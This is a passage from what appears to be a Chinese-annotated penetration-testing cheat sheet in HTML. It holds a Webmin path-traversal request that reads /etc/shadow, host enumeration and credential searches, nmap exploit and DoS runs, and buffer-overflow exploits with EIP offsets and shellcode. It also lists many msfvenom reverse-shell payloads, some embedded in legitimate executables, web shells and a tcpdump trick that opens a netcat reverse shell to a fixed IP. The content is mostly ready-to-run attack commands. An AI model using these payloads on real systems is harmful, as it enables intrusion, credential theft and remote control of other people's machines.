+<span class="token function">curl</span> http://<span class="token variable">$ip</span>:10000//unauthenticated/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/etc/passwd
+通过抓取 /etc/shadow 来测试 webmin 是否以 root 身份运行
+<span class="token function">curl</span> http://<span class="token variable">$ip</span>:10000//unauthenticated/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/<span class="token punctuation">..</span>%01/etc/shadow
+
+Linux 操作系统枚举
+列出所有 SUID 文件
+<span class="token function">find</span> / -perm -4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+确定当前的 Linux 版本
+<span class="token function">cat</span> /etc/issue
+确定有关环境的更多信息
+<span class="token function">uname</span> -a
+列出正在运行的进程
+<span class="token function">ps</span> -xaf
+列出调用使用的允许（和禁止）命令
+<span class="token function">sudo</span> -l
+列出 iptables 规则
+iptables --table nat --list 
+iptables -vL -t filter 
+iptables -vL -t nat 
+iptables -vL -t mangle 
+iptables -vL -t raw 
+iptables -vL -t security
+
+Windows 操作系统枚举
+net config Workstation
+systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span>
+<span class="token function">hostname</span>
+net <span class="token function">users</span>
+ipconfig /all
+route print
+arp -A
+<span class="token function">netstat</span> -ano
+netsh firewall show state
+netsh firewall show config
+schtasks /query /fo LIST /v
+tasklist /SVC
+net start
+DRIVERQUERY
+reg query HKLM<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Installer<span class="token punctuation">\</span>AlwaysInstallElevated
+reg query HKCU<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Installer<span class="token punctuation">\</span>AlwaysInstallElevated
+<span class="token function">dir</span> /s pass <span class="token operator">==</span> cred <span class="token operator">==</span> vnc <span class="token operator">==</span> .config
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+Nmap 漏洞利用脚本
+https://nmap.org/nsedoc/categories/exploit.html
+Nmap 通过漏洞脚本搜索
+<span class="token builtin class-name">cd</span> /usr/share/nmap/scripts/ 
+<span class="token function">ls</span> -l <span class="token punctuation">\</span>*vuln<span class="token punctuation">\</span>*
+Nmap 通过 Nmap 脚本搜索特定关键字
+<span class="token function">ls</span> /usr/share/nmap/scripts/<span class="token punctuation">\</span>* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ftp</span>
+使用 nmap 扫描易受攻击的漏洞
+nmap --script exploit -Pn <span class="token variable">$ip</span>
+Nmap 身份验证脚本
+https://nmap.org/nsedoc/categories/auth.html
+Nmap 漏洞扫描
+https://nmap.org/nsedoc/categories/vuln.html
+NMap DOS 扫描
+nmap --script dos -Pn <span class="token variable">$ip</span> NMap Execute DOS Attack nmap --max-parallelism <span class="token number">750</span> -Pn --script http-slowloris --script-args http-slowloris.runforever<span class="token operator">=</span>true
+扫描 Coldfusion Web 漏洞
+nmap -v -p <span class="token number">80</span> --script<span class="token operator">=</span>http-vuln-cve2010-2861 <span class="token variable">$ip</span>
+使用 Nmap 进行匿名 FTP 转储
+nmap -v -p <span class="token number">21</span> --script<span class="token operator">=</span>ftp-anon.nse <span class="token variable">$ip</span>-254
+使用 Nmap 进行 SMB 安全模式扫描
+nmap -v -p <span class="token number">21</span> --script<span class="token operator">=</span>ftp-anon.nse <span class="token variable">$ip</span>-254
+
+文件枚举
+查找 <span class="token environment constant">UID</span> <span class="token number">0</span> 文件 root 执行
+/usr/bin/find / -perm -g<span class="token operator">=</span>s -o -perm -4000 <span class="token operator">!</span> -type l -maxdepth <span class="token number">3</span> -exec <span class="token function">ls</span> -ld <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+获取方便的 linux 文件系统枚举脚本 <span class="token punctuation">(</span>/var/tmp<span class="token punctuation">)</span>
+<span class="token function">wget</span> https://highon.coffee/downloads/linux-local-enum.sh 
+<span class="token function">chmod</span> +x ./linux-local-enum.sh 
+./linux-local-enum.sh
+查找 <span class="token number">8</span> 月更新的可执行文件
+<span class="token function">find</span> / -executable -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null <span class="token operator">|</span> <span class="token function">egrep</span> -v <span class="token string">"^/bin|^/var|^/etc|^/usr"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">ls</span> -lh <span class="token operator">|</span> <span class="token function">grep</span> Aug
+在linux上查找特定文件
+<span class="token function">find</span> /. -name suid<span class="token punctuation">\</span>*
+查找文件中的所有字符串
+strings <span class="token operator">&lt;</span>filename<span class="token operator">></span>
+确定文件类型
+<span class="token function">file</span> <span class="token operator">&lt;</span>filename<span class="token operator">></span>
+
+HTTP 枚举
+使用 gobuster 爆破目录
+gobuster -w /usr/share/wordlists/dirb/common.txt -u <span class="token variable">$ip</span>
+OWasp DirBuster - Http文件夹枚举 - 可以带字典文件
+Dirb - 使用字典文件强力查找目录
+dirb http://<span class="token variable">$ip</span>/ wordlist.dict 
+dirb <span class="token operator">&lt;</span>http://vm/<span class="token operator">></span>
+Dirb 反向代理
+dirb <span class="token punctuation">[</span>http://<span class="token variable">$ip</span>/<span class="token punctuation">]</span><span class="token punctuation">(</span>http://172.16.0.19/<span class="token punctuation">)</span> -p <span class="token variable">$ip</span>:3129
+nikto
+nikto -h <span class="token variable">$ip</span>
+使用 NMAP 的 HTTP 枚举
+nmap --script<span class="token operator">=</span>http-enum -p80 -n <span class="token variable">$ip</span>/24
+Nmap 检查服务器方法
+nmap --script http-methods --script-args http-methods.url-path<span class="token operator">=</span><span class="token string">'/test'</span> <span class="token variable">$ip</span>
+从 Web 服务器获取可用选项 
+<span class="token function">curl</span> -vX OPTIONS vm/test
+Uniscan 目录查找器
+uniscan -qweds -u <span class="token operator">&lt;</span>http://vm/<span class="token operator">></span>
+Wfuzz - 网络暴力破解者
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt <span class="token variable">$ip</span>:60080/?FUZZ<span class="token operator">=</span>test
+wfuzz -c --hw <span class="token number">114</span> -w /usr/share/wfuzz/wordlist/general/megabeast.txt <span class="token variable">$ip</span>:60080/?page<span class="token operator">=</span>FUZZ
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt <span class="token string">"<span class="token variable">$ip</span>:60080/?page=mailer&amp;mail=FUZZ"</span>
+wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc <span class="token number">404</span> <span class="token variable">$ip</span>/FUZZ
+递归级别 <span class="token number">3</span>
+wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R <span class="token number">3</span> --sc <span class="token number">200</span> <span class="token variable">$ip</span>/FUZZ
+
+Open a <span class="token function">service</span> using a port knock 端口碰撞 <span class="token punctuation">(</span>Secured with Knockd<span class="token punctuation">)</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">x</span> <span class="token keyword">in</span> <span class="token number">7000</span> <span class="token number">8000</span> <span class="token number">9000</span><span class="token punctuation">;</span> <span class="token keyword">do</span> nmap -Pn --host_timeout <span class="token number">201</span> --max-retries <span class="token number">0</span> -p <span class="token variable">$x</span> server_ip_address<span class="token punctuation">;</span> <span class="token keyword">done</span>
+
+WordPress 扫描
+wpscan --url <span class="token variable">$ip</span>/blog --proxy <span class="token variable">$ip</span>:3129
+RSH 枚举 - 未加密的文件传输系统
+auxiliary/scanner/rservices/rsh_login
+
+Finger Enumeration 查存在用户，mail常用
+finger batman@<span class="token variable">$ip</span>
+
+TLS 和 SSL 测试
+./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U <span class="token variable">$ip</span> <span class="token operator">|</span> aha <span class="token operator">></span> OUTPUT-FILE.html
+
+代理枚举（对开放代理有用）
+nikto -useproxy http://<span class="token variable">$ip</span>:3128 -h <span class="token variable">$ip</span>
+
+隐写术
+<span class="token function">apt-get</span> <span class="token function">install</span> steghide
+steghide extract -sf picture.jpg
+steghide info picture.jpg
+<span class="token function">apt-get</span> <span class="token function">install</span> stegosuite
+
+OpenVAS 漏洞扫描器
+<span class="token function">apt-get</span> update
+<span class="token function">apt-get</span> <span class="token function">install</span> openvas
+openvas-setup
+<span class="token function">netstat</span> -tulpn
+登陆
+https://<span class="token variable">$ip</span>:9392<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="缓冲区溢出和漏洞利用"><a href="#缓冲区溢出和漏洞利用" class="headerlink" title="缓冲区溢出和漏洞利用"></a>缓冲区溢出和漏洞利用</h2><ul>
+<li><p>DEP 和 ASLR - 数据执行保护 (DEP) 和地址空间布局随机化 (ASLR)</p>
+</li>
+<li><p>Nmap Fuzzers：</p>
+<ul>
+<li>NMap Fuzzer List<br><a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/categories/fuzzer.html">https://nmap.org/nsedoc/categories/fuzzer.html</a></li>
+<li>NMap HTTP Form Fuzzer<br>nmap —script http-form-fuzzer —script-args ‘http-form-fuzzer.targets={1={path=/},2={path=/register.html}}’ -p 80 $ip</li>
+<li>Nmap DNS Fuzzer<br>nmap —script dns-fuzz —script-args timelimit=2h $ip -d</li>
+</ul>
+</li>
+<li><p>MSFvenom<br><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a></p>
+</li>
+<li><p>Windows 缓冲区溢出</p>
+<ul>
+<li><p>Controlling EIP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">locate</span> pattern_create
+pattern_create.rb -l <span class="token number">2700</span>
+<span class="token function">locate</span> pattern_offset
+pattern_offset.rb -q <span class="token number">39694438</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>验证 EIP 的确切位置 - [*] Exact match at offset 2606</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">buffer <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token punctuation">\</span>* <span class="token number">2606</span> + <span class="token string">"B"</span> <span class="token punctuation">\</span>* <span class="token number">4</span> + <span class="token string">"C"</span> <span class="token punctuation">\</span>* <span class="token number">90</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>检查 “Bad Characters” - Run multiple times 0x00 - 0xFF</p>
+</li>
+<li><p>使用 Mona 确定未受保护的模块</p>
+</li>
+<li><p>Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP 通过查找具有 JMP ESP 的读取和执行访问权限的内存位置来绕过 DEP（如果存在）</p>
+</li>
+<li><p>Use NASM to determine the HEX code for a JMP ESP instruction 使用 NASM 确定 JMP ESP 指令的 HEX 代码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+JMP ESP  
+00000000 FFE4 jmp esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>Run Mona in immunity log window to find (FFE4) XEF command</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona <span class="token function">find</span> -s <span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe4">\xe4</span>"</span> -m slmfc.dll  
+found at 0x5f4a358f - Flip around <span class="token keyword">for</span> little endian <span class="token function">format</span>
+buffer <span class="token operator">=</span> <span class="token string">"A"</span> * <span class="token number">2606</span> + <span class="token string">"<span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x5f">\x5f</span>"</span> + <span class="token string">"C"</span> * <span class="token number">390</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>MSFVenom 创建payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$ip</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f c –e x86/shikata_ga_nai -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0d">\x0d</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>Final Payload with NOP slide</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">buffer</span><span class="token operator">=</span><span class="token string">"A"</span>*2606 + <span class="token string">"<span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x5f">\x5f</span>"</span> + <span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token number">8</span> + shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>创建 PE 反向 Shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$ip</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f exe -o shell_reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$ip</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f exe -e x86/shikata_ga_nai -i <span class="token number">9</span> -o shell_reverse_msf_encoded.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>创建 PE 反向 shell 并将其嵌入到现有的可执行文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$ip</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f exe -e x86/shikata_ga_nai -i <span class="token number">9</span> -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>创建 PE 反向 HTTPS shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_https <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$ip</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f exe -o met_https_reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ul>
+</li>
+<li><p>Linux 缓冲区溢出</p>
+<ul>
+<li>针对应用程序运行 Evans 调试器<br>edb —run /usr/games/crossfire/bin/crossfire</li>
+<li>ESP 寄存器指向我们 CBuffer 的末尾<br>add eax,12<br>jmp eax<br>83C00C add eax,byte +0xc<br>FFE0 jmp eax</li>
+<li>检查 “Bad Characters” Process of elimination - Run multiple times 0x00 - 0xFF</li>
+<li>Find JMP ESP address<br>“\x97\x45\x13\x08” # Found at Address 08134597</li>
+<li>crash = “\x41” * 4368 + “\x97\x45\x13\x08” + “\x83\xc0\x0c\xff\xe0\x90\x90”</li>
+<li>msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b “\x00\x0a\x0d\x20” –e x86/shikata_ga_nai</li>
+<li>使用 netcat 连接到 shell<br>nc -v $ip 4444</li>
+</ul>
+</li>
+</ul>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>ruby: <code>exec &quot;/bin/sh&quot;</code></p>
+<p>lua: <code>os.execute(&#39;/bin/sh&#39;)</code></p>
+<p>From within IRB: <code>exec &quot;/bin/sh&quot;</code></p>
+<p>From within vi: <code>:!bash</code> or<code>:set shell=/bin/bash:shell</code></p>
+<p>From within vim <code>&#39;:!bash&#39;:</code></p>
+<p>From within nmap: <code>!sh</code></p>
+<p>From within tcpdump</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> $’id<span class="token punctuation">\</span>n/bin/netcat <span class="token number">192.168</span>.110.128 <span class="token number">443</span> –e /bin/bash’ <span class="token operator">></span> /tmp/.test
+<span class="token function">chmod</span> +x /tmp/.test
+<span class="token function">sudo</span> tcpdump –ln –I eth- -w /dev/null –W <span class="token number">1</span> –G <span class="token number">1</span> –z /tmp/.tst –Z root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>From busybox <code>/bin/busybox telnetd -|/bin/sh -p9999</code></p>
+<p>PHP reverse shell<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/web-shells/php-reverse-shel">http://pentestmonkey.net/tools/web-shells/php-reverse-shel</a></p>
+<p>php-findsock-shell - turns PHP port 80 into an interactive shell<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/web-shells/php-findsock-shell">http://pentestmonkey.net/tools/web-shells/php-findsock-shell</a></p>
+<p>Perl Reverse Shell<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a></p>
+<p>PHP powered web browser Shell b374k with file upload etc.<br><a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">https://github.com/b374k/b374k</a></p>
+<p>Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1</a></p>
+<p>来自 Fuzzdb 的 Web 后门</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors">https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors</a></p>
+<p>使用 MSFVenom 创建 Meterpreter Shell </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ksanchezcld/Hacking_Cheat_Sheet/blob/master/msfvenom">https://github.com/ksanchezcld/Hacking_Cheat_Sheet/blob/master/msfvenom</a></p>
+<p>Linux</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>windows</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Mac</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f macho <span class="token operator">></span> shell.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>Web Payloads</strong></p>
+<p>PHP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/reverse_php <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.php
+msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>需要在文件的第一行添加 &lt;?php 以便它将作为 PHP 网页执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ASP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>JSP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>WAR</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f war <span class="token operator">></span> shell.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>Scripting Payloads</strong></p>
+<p>Python</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Bash</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Perl</p>
